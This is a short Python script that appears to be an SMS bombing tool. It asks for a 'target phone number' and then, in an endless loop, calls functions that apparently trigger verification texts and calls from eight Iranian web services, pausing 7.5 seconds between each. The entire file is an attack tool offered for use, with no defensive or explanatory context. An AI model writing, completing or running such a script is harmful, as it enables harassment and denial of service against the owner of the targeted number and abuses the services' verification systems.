import time
from cafebazar_api import cafebazar_sms
from digikala_api import digikala_sms
from divar_api import divar_sms
from sheypoor_api import sheypoor_sms
from snapp_api import snapp_sms
from tapsi_api import tapsi_sms_call
from poonisha_api import poonisha_sms
from taghcheh_api import taghcheh_sms

phone = input("Enter target phone number: (example : 9XXXXXXXXXXX) ")

while True:
    cafebazar_sms(phone)
    time.sleep(7.5)
    digikala_sms(phone)
    time.sleep(7.5)
    divar_sms(phone)
    time.sleep(7.5)
    sheypoor_sms(phone)
    time.sleep(7.5)
    snapp_sms(phone)
    time.sleep(7.5)
    tapsi_sms_call(phone)
    time.sleep(7.5)
    poonisha_sms(phone)
    time.sleep(7.5)
    taghcheh_sms(phone)
